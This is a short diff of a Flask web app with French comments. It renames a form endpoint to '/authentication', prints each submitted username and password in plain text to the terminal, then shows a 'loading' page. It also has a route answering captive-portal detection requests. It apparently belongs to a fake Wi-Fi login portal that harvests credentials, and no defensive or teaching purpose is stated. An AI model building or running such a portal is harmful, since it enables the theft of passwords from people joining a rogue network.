@@ -6,13 +6,13 @@ app = Flask(__name__)
 def index():
     return render_template('index.html')
 
-@app.route('/send_text', methods=['POST'])
+@app.route('/authentication', methods=['POST'])
 def send_text():
     # Récupère le texte envoyé par le formulaire
     user = request.form['text_input']
     password = request.form['password_input']
     print(f"User {user} \nPassword {password}")  # Affiche le texte dans le terminal
-    return render_template('index.html')  # Affiche le texte
+    return render_template('loading.html')  # Affiche le texte
 
 @app.route('/hotspot-detect.html')
 def hotspot_detect():
